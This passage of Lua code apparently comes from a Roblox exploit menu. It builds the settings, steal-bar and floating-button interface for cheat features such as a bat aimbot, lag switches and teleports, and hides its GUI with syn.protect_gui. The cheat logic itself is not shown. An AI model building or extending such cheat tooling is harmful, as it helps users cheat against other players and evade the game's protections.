        setLockUIVisual = mkFastToggle(speedPage, "Lock UI", function(on) toggleLockUI(on) end)
        setHideButtonsVisual = mkFastToggle(speedPage, "Hide Button", function(on) toggleHideButtons(on) end)
        if setHideButtonsVisual then setHideButtonsVisual(hideButtonsEnabled) end
    
        do
            local row = mkRow(speedPage, 42)
            mkLabel(row, "UI Scale")
            uiScaleBox = mkBox(row, uiScaleValue, 50, 56, function(v)
                local n = _clamp(_floor(v+0.5), 50, 150)
                uiScaleValue = n
                if mainUIScale then mainUIScale.Scale = n/100 end
                if pbScale then pbScale.Scale = n/100 end
            end)
        end
        do
            local row = mkRow(speedPage, 42)
            mkLabel(row, "Button Scale")
            local box = mkBox(row, _floor(floatingButtonScale * 100), 50, 56, function(v)
                local val = _clamp(v, 50, 200)
                floatingButtonScale = val / 100
                applyFloatingButtonScale()
                saveAllSettings()
            end)
        end
        do
            local row = mkRow(speedPage, 42)
            mkLabel(row, "Steal Bar Size")
            stealBarScaleBox = mkBox(row, stealBarScale, 50, 56, function(v)
                local val = _clamp(v, 50, 250)
                stealBarScale = val
                if pbScale then pbScale.Scale = val / 100 end
                saveAllSettings()
            end)
        end
    
        do
            local row = mkRow(speedPage, 44)
            row.Size = UDim2.new(1, 0, 0, 44)
            local saveBtn = Instance.new("TextButton", row)
            saveBtn.Size = UDim2.new(1, -12, 0.8, 0)
            saveBtn.Position = UDim2.new(0, 6, 0.1, 0)
            saveBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
            saveBtn.BorderSizePixel = 0
            saveBtn.Text = "SAVE CONFIG"
            saveBtn.TextColor3 = Color3.fromRGB(20, 20, 25)
            saveBtn.Font = Enum.Font.GothamBold
            saveBtn.TextSize = 13
            saveBtn.AutoButtonColor = false
            saveBtn.ZIndex = 8
            Instance.new("UICorner", saveBtn).CornerRadius = UDim.new(0, 10)
            local saveStroke = Instance.new("UIStroke", saveBtn)
            saveStroke.Color = getThemeColor()
            saveStroke.Thickness = 1.5
            saveStroke.Transparency = 0.4
            saveBtn.MouseEnter:Connect(function()
                TS:Create(saveBtn, TweenInfo.new(0.15), {BackgroundColor3 = getThemeColor()}):Play()
                TS:Create(saveBtn, TweenInfo.new(0.15), {TextColor3 = Color3.fromRGB(255,255,255)}):Play()
            end)
            saveBtn.MouseLeave:Connect(function()
                TS:Create(saveBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(245, 245, 250)}):Play()
                TS:Create(saveBtn, TweenInfo.new(0.15), {TextColor3 = Color3.fromRGB(20, 20, 25)}):Play()
            end)
            saveBtn.MouseButton1Click:Connect(function()
                local ok = saveAllSettings(true)
                saveBtn.Text = ok and "SAVED" or "ERROR"
                task.delay(1.2, function()
                    if saveBtn and saveBtn.Parent then saveBtn.Text = "SAVE CONFIG" end
                end)
            end)
        end
        do
            local row = mkRow(speedPage, 44)
            row.Size = UDim2.new(1, 0, 0, 44)
            local resetPosBtn = Instance.new("TextButton", row)
            resetPosBtn.Size = UDim2.new(1, -12, 0.8, 0)
            resetPosBtn.Position = UDim2.new(0, 6, 0.1, 0)
            resetPosBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
            resetPosBtn.BorderSizePixel = 0
            resetPosBtn.Text = "RESET POSITIONS"
            resetPosBtn.TextColor3 = Color3.fromRGB(20, 20, 25)
            resetPosBtn.Font = Enum.Font.GothamBold
            resetPosBtn.TextSize = 13
            resetPosBtn.AutoButtonColor = false
            resetPosBtn.ZIndex = 8
            Instance.new("UICorner", resetPosBtn).CornerRadius = UDim.new(0, 10)
            local resetStroke = Instance.new("UIStroke", resetPosBtn)
            resetStroke.Color = getThemeColor()
            resetStroke.Thickness = 1.5
            resetStroke.Transparency = 0.4
            resetPosBtn.MouseEnter:Connect(function()
                TS:Create(resetPosBtn, TweenInfo.new(0.15), {BackgroundColor3 = getThemeColor()}):Play()
                TS:Create(resetPosBtn, TweenInfo.new(0.15), {TextColor3 = Color3.fromRGB(255,255,255)}):Play()
            end)
            resetPosBtn.MouseLeave:Connect(function()
                TS:Create(resetPosBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(245, 245, 250)}):Play()
                TS:Create(resetPosBtn, TweenInfo.new(0.15), {TextColor3 = Color3.fromRGB(20, 20, 25)}):Play()
            end)
            local resetDebounce = false
            resetPosBtn.MouseButton1Click:Connect(function()
                if resetDebounce then return end
                resetDebounce = true
                resetFloatingPositions()
                resetPosBtn.Text = "RESET"
                task.delay(1.2, function()
                    if resetPosBtn and resetPosBtn.Parent then
                        resetPosBtn.Text = "RESET POSITIONS"
                        resetDebounce = false
                    end
                end)
            end)
        end
        do
            local row = mkRow(speedPage, 44)
            row.Size = UDim2.new(1, 0, 0, 44)
            local delBtn = Instance.new("TextButton", row)
            delBtn.Size = UDim2.new(1, -12, 0.8, 0)
            delBtn.Position = UDim2.new(0, 6, 0.1, 0)
            delBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
            delBtn.BorderSizePixel = 0
            delBtn.Text = "RESET ALL SETTINGS"
            delBtn.TextColor3 = Color3.fromRGB(170, 30, 50)
            delBtn.Font = Enum.Font.GothamBold
            delBtn.TextSize = 13
            delBtn.AutoButtonColor = false
            delBtn.ZIndex = 8
            Instance.new("UICorner", delBtn).CornerRadius = UDim.new(0, 10)
            local delStroke = Instance.new("UIStroke", delBtn)
            delStroke.Color = Color3.fromRGB(200, 60, 80)
            delStroke.Thickness = 1.5
            delStroke.Transparency = 0.4
            delBtn.MouseEnter:Connect(function()
                TS:Create(delBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(200, 50, 70)}):Play()
                TS:Create(delBtn, TweenInfo.new(0.15), {TextColor3 = Color3.fromRGB(255,255,255)}):Play()
            end)
            delBtn.MouseLeave:Connect(function()
                TS:Create(delBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(245, 245, 250)}):Play()
                TS:Create(delBtn, TweenInfo.new(0.15), {TextColor3 = Color3.fromRGB(170, 30, 50)}):Play()
            end)
            local deleteState = 0
            local originalDeleteText = "RESET ALL SETTINGS"
            local delDebounce = false
            delBtn.MouseButton1Click:Connect(function()
                if delDebounce then return end
                if deleteState == 0 then
                    deleteState = 1
                    delBtn.Text = "CONFIRM?"
                    delBtn.BackgroundColor3 = Color3.fromRGB(255, 220, 220)
                    delBtn.TextColor3 = Color3.fromRGB(160, 0, 0)
                    task.delay(2, function()
                        if delBtn and delBtn.Parent and deleteState == 1 then
                            deleteState = 0
                            delBtn.Text = originalDeleteText
                            delBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
                            delBtn.TextColor3 = Color3.fromRGB(170, 30, 50)
                        end
                    end)
                elseif deleteState == 1 then
                    delDebounce = true
                    local invoked, success = pcall(resetToFactoryDefaults)
                    success = invoked and success
                    delBtn.Text = success and "SETTINGS RESET" or "ERROR"
                    delBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
                    delBtn.TextColor3 = Color3.fromRGB(170, 30, 50)
                    deleteState = 0
                    task.delay(1.5, function()
                        if delBtn and delBtn.Parent then
                            delBtn.Text = originalDeleteText
                            delBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
                            delBtn.TextColor3 = Color3.fromRGB(170, 30, 50)
                            delDebounce = false
                        end
                    end)
                end
            end)
        end
    
      -- =====================================================================
    -- VISION-STYLE STEAL BAR
    -- =====================================================================
    pbFrame = Instance.new("Frame", gui)
    pbFrame.Name = "StealBar"
    pbFrame.AnchorPoint = Vector2.new(0.5, 1)
    pbFrame.Size = UDim2.new(0, 306, 0, 62)
    pbFrame.Position = UDim2.new(0.5, 0, 1, -70)
    pbFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 7)
    pbFrame.BackgroundTransparency = 0.02
    pbFrame.BorderSizePixel = 0
    pbFrame.Active = true
    pbFrame.ZIndex = 50
    pbFrame.ClipsDescendants = false
    pbFrame.Visible = true
    
    pbScale = Instance.new("UIScale", pbFrame)
    pbScale.Scale = (stealBarScale or 100) / 100
    
    Instance.new("UICorner", pbFrame).CornerRadius = UDim.new(0, 12)
    
    local sbStroke = Instance.new("UIStroke", pbFrame)
    sbStroke.Color = Color3.fromRGB(45, 45, 62)
    sbStroke.Thickness = 1
    sbStroke.Transparency = 0.38
    sbStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    
    -- % label (kaliwa)
    progressPct = Instance.new("TextLabel", pbFrame)
    progressPct.Name = "ProgressPct"
    progressPct.Size = UDim2.new(0, 80, 0, 14)
    progressPct.Position = UDim2.new(0, 10, 0, 2)
    progressPct.BackgroundTransparency = 1
    progressPct.Text = "0%"
    progressPct.TextColor3 = Color3.fromRGB(255, 255, 255)
    progressPct.Font = Enum.Font.GothamBlack
    progressPct.TextSize = 16
    progressPct.TextXAlignment = Enum.TextXAlignment.Left
    progressPct.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    progressPct.TextStrokeTransparency = 0.5
    progressPct.ZIndex = 51
    
    -- Radius label (kanan)
    progressRadLbl = Instance.new("TextLabel", pbFrame)
    progressRadLbl.Name = "ProgressRadLbl"
    progressRadLbl.Size = UDim2.new(0, 120, 0, 18)
    progressRadLbl.Position = UDim2.new(1, -130, 0, 2)
    progressRadLbl.BackgroundTransparency = 1
    progressRadLbl.Text = string.format("Radius: %.2g", CONFIG.STEAL_RANGE)
    progressRadLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    progressRadLbl.Font = Enum.Font.GothamBlack
    progressRadLbl.TextSize = 13
    progressRadLbl.TextXAlignment = Enum.TextXAlignment.Right
    progressRadLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    progressRadLbl.TextStrokeTransparency = 0.5
    progressRadLbl.ZIndex = 51
    
    -- FPS/PING label (gitna)
    local sbFpsLabel = Instance.new("TextLabel", pbFrame)
    sbFpsLabel.Name = "FpsPingLabel"
    sbFpsLabel.Size = UDim2.new(1, -20, 0, 14)
    sbFpsLabel.Position = UDim2.new(0, 11, 0, 22)
    sbFpsLabel.BackgroundTransparency = 1
    sbFpsLabel.Text = "FPS: --  PING: --"
    sbFpsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    sbFpsLabel.Font = Enum.Font.GothamMedium
    sbFpsLabel.TextSize = 10
    sbFpsLabel.TextXAlignment = Enum.TextXAlignment.Center
    sbFpsLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    sbFpsLabel.TextStrokeTransparency = 0.65
    sbFpsLabel.ZIndex = 51
    
    -- FPS/PING updater
    task.spawn(function()
        local startTime = tick()
        local amount = 0
        local calculatedValue = 0
        while sbFpsLabel and sbFpsLabel.Parent do
            amount += 1
            local phaseStartTime = tick()
            if phaseStartTime - startTime >= 0.5 then
                local fps = math.floor(amount / (phaseStartTime - startTime))
                local ok, ping = pcall(function()
                    return LP:GetNetworkPing() * 1000
                end)
                if ok and ping then calculatedValue = math.floor(ping) end
                sbFpsLabel.Text = string.format("FPS: %d  PING: %dms", fps, calculatedValue)
                amount = 0
                startTime = phaseStartTime
            end
            task.wait()
        end
    end)
    
    -- Progress bar bg
    local sbBarBg = Instance.new("Frame", pbFrame)
    sbBarBg.Name = "BarBg"
    sbBarBg.Size = UDim2.new(1, -20, 0, 14)
    sbBarBg.Position = UDim2.new(0, 10, 1, -17)
    sbBarBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    sbBarBg.BorderSizePixel = 0
    sbBarBg.ZIndex = 51
    sbBarBg.ClipsDescendants = true
    Instance.new("UICorner", sbBarBg).CornerRadius = UDim.new(1, 0)
    
    local sbBarStroke = Instance.new("UIStroke", sbBarBg)
    sbBarStroke.Color = Color3.fromRGB(34, 34, 40)
    sbBarStroke.Thickness = 1
    sbBarStroke.Transparency = 0.08
    sbBarStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    
    -- Progress fill (purple)
    progressFill = Instance.new("Frame", sbBarBg)
    progressFill.Name = "ProgressFill"
    progressFill.Size = UDim2.fromScale(0, 1)
    progressFill.BackgroundColor3 = Color3.fromRGB(190, 120, 255)
    progressFill.BorderSizePixel = 0
    progressFill.ZIndex = 52
    progressFill.ClipsDescendants = true
    Instance.new("UICorner", progressFill).CornerRadius = UDim.new(1, 0)
    
    local pGrad = Instance.new("UIGradient", progressFill)
    pGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(188, 108, 252)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(158, 172, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 86, 246)),
    })
    pGrad.Rotation = 90
    
    -- Draggable
    local dn, ds, sp, di = false, nil, nil, nil
    local endConn = nil
    pbFrame.InputBegan:Connect(function(i)
        if uiLocked then return end
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dn = true; ds = i.Position; sp = pbFrame.Position
            if endConn then endConn:Disconnect() end
            endConn = i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then
                    dn = false
                    if endConn then endConn:Disconnect(); endConn = nil end
                    task.defer(function()
                        savedProgressBarPos = {
                            XScale = pbFrame.Position.X.Scale,
                            XOffset = pbFrame.Position.X.Offset,
                            YScale = pbFrame.Position.Y.Scale,
                            YOffset = pbFrame.Position.Y.Offset
                        }
                        pcall(saveAllSettings)
                    end)
                end
            end)
        end
    end)
    pbFrame.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dn = false
            if endConn then endConn:Disconnect(); endConn = nil end
        end
    end)
    UIS.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dn = false
            if endConn then endConn:Disconnect(); endConn = nil end
        end
    end)
    pbFrame.InputChanged:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then di = i end
    end)
    UIS.InputChanged:Connect(function(i)
        if i == di and dn then
            if uiLocked then dn = false; return end
            if not ds or not sp then return end
            local nX = sp.X.Offset + (i.Position.X - ds.X)
            local nY = sp.Y.Offset + (i.Position.Y - ds.Y)
            pbFrame.Position = UDim2.new(sp.X.Scale, nX, sp.Y.Scale, nY)
        end
    end)
    
    _G.__YoutStealBar = pbFrame
    end
    
    function createMobilePanel()
        local panel = Instance.new("ScreenGui")
        panel.Name = "YoutMobilePanel"
        panel.ResetOnSpawn = false
        panel.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        pcall(function() if syn and syn.protect_gui then syn.protect_gui(panel) end end)
        local okPanel = pcall(function() panel.Parent = game:GetService("CoreGui") end)
        if not okPanel then panel.Parent = LP:WaitForChild("PlayerGui") end
    
        local BTN_W, BTN_H = 60, 60
        local buttons = {}
        local buttonNames = {"DropBR", "AutoLeft", "AutoBat", "AutoRight", "TpDown", "Carry", "Lagger1", "Lagger2"}
        local buttonTexts = {"DROP\nBR", "AUTO\nLEFT", "BAT\nAIMBOT", "AUTO\nRIGHT", "TP\nDOWN", "CARRY\nSPD", "LAGGER\nNORMAL", "LAGGER\nCARRY"}
    
        local function createButton(name, text, order, isToggle, callback)
            local btn = Instance.new("TextButton", panel)
            btn.Name = name
            btn.Size = UDim2.new(0, BTN_W, 0, BTN_H)
            btn.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
            btn.BorderSizePixel = 0
            btn.Text = ""
            btn.AutoButtonColor = false
            btn.ZIndex = 10
    
            local savedPos = savedButtonPositions[name]
            if savedPos then
                btn.Position = UDim2.new(0, savedPos.X or 0, 0, savedPos.Y or 0)
            else
                local defX, defY = getDefaultButtonPosition(name)
                btn.Position = UDim2.new(0, defX, 0, defY)
            end
    
            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
    
            local bgGrad = Instance.new("UIGradient", btn)
            bgGrad.Name = "BtnGrad"
            bgGrad.Rotation = 90
            bgGrad.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(28, 28, 34)),
                ColorSequenceKeypoint.new(0.45, Color3.fromRGB(16, 16, 20)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(5, 5, 8)),
            })
    
            local stroke = Instance.new("UIStroke", btn)
            stroke.Color = Color3.fromRGB(60, 60, 70)
            stroke.Thickness = 1
            stroke.Transparency = 0.45
            stroke.Name = "NormalStroke"
    
            local label = Instance.new("TextLabel", btn)
            label.Name = "TextLabel"
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.Text = text
            label.TextColor3 = Color3.fromRGB(200, 200, 210)
            label.Font = Enum.Font.GothamBlack
            label.TextSize = 11
            label.TextWrapped = true
            label.ZIndex = 11
    
            local uiScale = Instance.new("UIScale", btn)
            uiScale.Scale = floatingButtonScale
            table.insert(_floatingUIScales, uiScale)
    
            local active = false
            local function setActive(state)
                active = state
                btn:SetAttribute("MobActive", state and true or false)
                paintFloatingBtn(btn, state)
            end
            setActive(false)
    
            local dragging = false
            local hasMoved = false
            local dragStart = nil
            local startPos = nil
            local movedDistance = 0
    
            local function onInputBegan(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    dragging = true; hasMoved = false; movedDistance = 0
                    dragStart = input.Position; startPos = btn.Position
                    _isDraggingButton = true
                end
            end
    
            local function onInputChanged(input)
                if not dragging then return end
                if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                    local delta = input.Position - dragStart
                    movedDistance = delta.Magnitude
                    if not uiLocked then
                        hasMoved = true
                        btn.Position = UDim2.new(0, startPos.X.Offset + delta.X, 0, startPos.Y.Offset + delta.Y)
                    end
                end
            end
    
            local function onInputEnded(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    if dragging then
                        if movedDistance < 12 then
                            if isToggle then
                                if callback then callback(setActive) end
                            else
                                if callback then callback(setActive, active) end
                            end
                        elseif not uiLocked and hasMoved then
                            savedButtonPositions[name] = {X = btn.Position.X.Offset, Y = btn.Position.Y.Offset}
                            task.defer(function() pcall(saveAllSettings) end)
                        end
                        dragging = false; hasMoved = false
                        dragStart = nil; startPos = nil; movedDistance = 0
                        _isDraggingButton = false
                    end
                end
            end
    
            btn.InputBegan:Connect(onInputBegan)
            btn.InputChanged:Connect(onInputChanged)
            btn.InputEnded:Connect(onInputEnded)
    
            UIS.InputEnded:Connect(function(inp)
                if inp.UserInputType ~= Enum.UserInputType.Touch
                   and inp.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                if dragging then onInputEnded(inp) end
            end)
    
            buttons[name] = {btn = btn, setActive = setActive, label = label}
            return setActive
        end
    
        for i, name in ipairs(buttonNames) do
            local text = buttonTexts[i]
            local callback
            if name == "DropBR" then
                callback = function(setActive)
                    if autoBatEnabled then return end
                    setActive(true)
                    executeDropWithToggle(function(v)
                        if dropBrainrotSetVisual then dropBrainrotSetVisual(v) end
                    end)
                    task.delay(0.3, function() setActive(false) end)
                end
            elseif name == "AutoLeft" then
                callback = function(setActive)
                    autoLeftEnabled = not autoLeftEnabled
                    setActive(autoLeftEnabled)
                    if autoLeftEnabled then startAutoLeft() else stopAutoLeft() end
                    if autoLeftSetVisual then autoLeftSetVisual(autoLeftEnabled) end
                end
            elseif name == "AutoBat" then
                callback = function(setActive)
                    if not autoBatEnabled then enableAutoBat() else disableAutoBat() end
                    setActive(autoBatEnabled)
                end
            elseif name == "AutoRight" then
                callback = function(setActive)
                    autoRightEnabled = not autoRightEnabled
                    setActive(autoRightEnabled)
                    if autoRightEnabled then startAutoRight() else stopAutoRight() end
                    if autoRightSetVisual then autoRightSetVisual(autoRightEnabled) end
                end
            elseif name == "TpDown" then
                callback = function(setActive)
                    teleportDown()
                    setActive(true)
                    task.delay(0.2, function() setActive(false) end)
                end
            elseif name == "Carry" then
                callback = function(setActive)
                    if not speedMode then
                        speedMode = true; laggerToggled = false; laggerCarryToggled = false; setActive(true)
                        if buttons.Lagger1 and buttons.Lagger1.setActive then buttons.Lagger1.setActive(false) end
                        if buttons.Lagger2 and buttons.Lagger2.setActive then buttons.Lagger2.setActive(false) end
                    else
                        speedMode = false; setActive(false)
                    end
                    refreshSpeedModeLabel()
                    if _G.__YoutApplySpeedNow then pcall(_G.__YoutApplySpeedNow) end
                end
            elseif name == "Lagger1" then
                callback = function(setActive)
                    if speedMode then speedMode = false; if mobSetCarry then mobSetCarry(false) end end
                    if not laggerToggled then
                        laggerToggled = true; laggerCarryToggled = false; setActive(true)
                        if buttons.Lagger2 and buttons.Lagger2.setActive then buttons.Lagger2.setActive(false) end
                    else
                        laggerToggled = false; setActive(false)
                    end
                    refreshSpeedModeLabel()
                    if _G.__YoutApplySpeedNow then pcall(_G.__YoutApplySpeedNow) end
                end
            elseif name == "Lagger2" then
                callback = function(setActive)
                    if speedMode then speedMode = false; if mobSetCarry then mobSetCarry(false) end end
                    if not laggerCarryToggled then
                        laggerCarryToggled = true; laggerToggled = false; setActive(true)
                        if buttons.Lagger1 and buttons.Lagger1.setActive then buttons.Lagger1.setActive(false) end
                    else
                        laggerToggled = false; setActive(false)
                    end
                    refreshSpeedModeLabel()
                    if _G.__YoutApplySpeedNow then pcall(_G.__YoutApplySpeedNow) end
                end
            end
            local setActive = createButton(name, text, i-1, true, callback)
            if name == "AutoBat" then mobSetAutoBat = setActive end
            if name == "AutoLeft" then mobSetAutoLeft = setActive end
            if name == "AutoRight" then mobSetAutoRight = setActive end
            if name == "DropBR" then mobSetDropBR = setActive end
            if name == "TpDown" then mobSetTpDown = setActive end
            if name == "Carry" then mobSetCarry = setActive end
            if name == "Lagger1" then mobSetLagger1 = setActive end
            if name == "Lagger2" then mobSetLagger2 = setActive end
        end
    
        if buttons.AutoBat and buttons.AutoBat.setActive then buttons.AutoBat.setActive(autoBatEnabled) end
        if buttons.AutoLeft and buttons.AutoLeft.setActive then buttons.AutoLeft.setActive(autoLeftEnabled) end
        if buttons.AutoRight and buttons.AutoRight.setActive then buttons.AutoRight.setActive(autoRightEnabled) end
        if buttons.Carry and buttons.Carry.setActive then buttons.Carry.setActive(speedMode) end
        if buttons.Lagger1 and buttons.Lagger1.setActive then buttons.Lagger1.setActive(laggerToggled) end
        if buttons.Lagger2 and buttons.Lagger2.setActive then buttons.Lagger2.setActive(laggerCarryToggled) end
    
        return panel
    end
    
    function createTpBatFloatingButton()
        local panel = Instance.new("ScreenGui")
        panel.Name = "TpBatButton"
        panel.ResetOnSpawn = false
        panel.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        panel.DisplayOrder = 21
        pcall(function() if syn and syn.protect_gui then syn.protect_gui(panel) end end)
        local okPanel = pcall(function() panel.Parent = game:GetService("CoreGui") end)
        if not okPanel then panel.Parent = LP:WaitForChild("PlayerGui") end
    
        local btnFrame = Instance.new("Frame", panel)
        btnFrame.Size = UDim2.new(0, 60, 0, 60)
        btnFrame.Name = "Frame"
        if tpBatFloatingPos then
            btnFrame.Position = UDim2.new(tpBatFloatingPos.XScale or 0.5, tpBatFloatingPos.XOffset or 20, tpBatFloatingPos.YScale or 0, tpBatFloatingPos.YOffset or 10)
        else
            btnFrame.Position = UDim2.new(0.5, 20, 0, 10)
        end
        btnFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
        btnFrame.BorderSizePixel = 0
        btnFrame.ZIndex = 20
        Instance.new("UICorner", btnFrame).CornerRadius = UDim.new(0, 12)
        local bgGrad = Instance.new("UIGradient", btnFrame)
        bgGrad.Name = "BtnGrad"
        bgGrad.Rotation = 90
        bgGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(28, 28, 34)),
            ColorSequenceKeypoint.new(0.45, Color3.fromRGB(16, 16, 20)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(5, 5, 8)),
        })
    
        local stroke = Instance.new("UIStroke", btnFrame)
        stroke.Color = Color3.fromRGB(60, 60, 70)
        stroke.Thickness = 1
        stroke.Transparency = 0.45
        stroke.Name = "NormalStroke"
    
        local label = Instance.new("TextLabel", btnFrame)
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.Text = "TP\nBAT"
        label.TextColor3 = Color3.fromRGB(200, 200, 210)
        label.Font = Enum.Font.GothamBlack
        label.TextSize = 11
        label.TextWrapped = true
        label.ZIndex = 21
    
        local uiScale = Instance.new("UIScale", btnFrame)
        uiScale.Scale = floatingButtonScale
        table.insert(_floatingUIScales, uiScale)
    
        local function setActive(state)
            label.Text = "TP\nBAT"
            paintFloatingBtn(btnFrame, state)
        end
    
        local dragging = false; local hasMoved = false; local dragStart, startPos
        btnFrame.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
                dragging = true; hasMoved = false; dragStart = inp.Position; startPos = btnFrame.Position
            end
        end)
        btnFrame.InputChanged:Connect(function(inp)
            if not dragging then return end
            if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
                local delta = inp.Position - dragStart
                if delta.Magnitude > 5 then hasMoved = true end
                if hasMoved and not uiLocked then
                    btnFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
                end
            end
        end)
        btnFrame.InputEnded:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
                if dragging then
                    if not hasMoved then
                        toggleBatDesyncTp()
                        setActive(batDesyncTpEnabled)
                        if _G.__YoutBatV2Frame then
                            paintFloatingBtn(_G.__YoutBatV2Frame, autoBatV2Enabled)
                        end
                        if autoBatV2SetVisual then autoBatV2SetVisual(autoBatV2Enabled) end
                    elseif not uiLocked and hasMoved then
                        tpBatFloatingPos = {XScale = btnFrame.Position.X.Scale, XOffset = btnFrame.Position.X.Offset, YScale = btnFrame.Position.Y.Scale, YOffset = btnFrame.Position.Y.Offset}
                        task.defer(function() pcall(saveAllSettings) end)
                    end
                    dragging = false; hasMoved = false
                end
            end
        end)
    
        tpBatFloatingButton = panel
        return panel
    end
    
    function createBatV2FloatingButton()
        local panel = Instance.new("ScreenGui")
        panel.Name = "BatV2Button"
        panel.ResetOnSpawn = false
        panel.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        panel.DisplayOrder = 22
        pcall(function() if syn and syn.protect_gui then syn.protect_gui(panel) end end)
        local okPanel = pcall(function() panel.Parent = game:GetService("CoreGui") end)
        if not okPanel then panel.Parent = LP:WaitForChild("PlayerGui") end
    
        local btnFrame = Instance.new("Frame", panel)
        btnFrame.Size = UDim2.new(0, 60, 0, 60)
        btnFrame.Name = "Frame"
        
        if _G.__YoutBatV2Pos then
            btnFrame.Position = UDim2.new(
                _G.__YoutBatV2Pos.XScale or 0.5,
                _G.__YoutBatV2Pos.XOffset or 90,
                _G.__YoutBatV2Pos.YScale or 0,
                _G.__YoutBatV2Pos.YOffset or 10
            )
        elseif tpBatFloatingPos then
            btnFrame.Position = UDim2.new(
                tpBatFloatingPos.XScale or 0.5,
                (tpBatFloatingPos.XOffset or 20) + 70,
                tpBatFloatingPos.YScale or 0,
                tpBatFloatingPos.YOffset or 10
            )
        else
            btnFrame.Position = UDim2.new(0.5, 90, 0, 10)
        end
        btnFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
        btnFrame.BorderSizePixel = 0
        btnFrame.ZIndex = 20
        Instance.new("UICorner", btnFrame).CornerRadius = UDim.new(0, 12)
    
        local bgGrad = Instance.new("UIGradient", btnFrame)
        bgGrad.Name = "BtnGrad"
        bgGrad.Rotation = 90
        bgGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(28, 28, 34)),
            ColorSequenceKeypoint.new(0.45, Color3.fromRGB(16, 16, 20)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(5, 5, 8)),
        })
    
        local stroke = Instance.new("UIStroke", btnFrame)
        stroke.Color = Color3.fromRGB(60, 60, 70)
        stroke.Thickness = 1
        stroke.Transparency = 0.45
        stroke.Name = "NormalStroke"
    
        local label = Instance.new("TextLabel", btnFrame)
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.Text = "BAT\nV2"
        label.TextColor3 = Color3.fromRGB(200, 200, 210)
        label.Font = Enum.Font.GothamBlack
        label.TextSize = 11
        label.TextWrapped = true
        label.ZIndex = 21
    
        local uiScale = Instance.new("UIScale", btnFrame)
        uiScale.Scale = floatingButtonScale
        table.insert(_floatingUIScales, uiScale)
    
        local dragging = false; local hasMoved = false; local dragStart, startPos
        btnFrame.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
                dragging = true; hasMoved = false; dragStart = inp.Position; startPos = btnFrame.Position
            end
        end)
        btnFrame.InputChanged:Connect(function(inp)
            if not dragging then return end
            if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
                local delta = inp.Position - dragStart
                if delta.Magnitude > 5 then hasMoved = true end
                if hasMoved and not uiLocked then
                    btnFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
                end
            end
        end)
        btnFrame.InputEnded:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
                if dragging then
                    if not hasMoved then
                        local on = toggleBatV2()
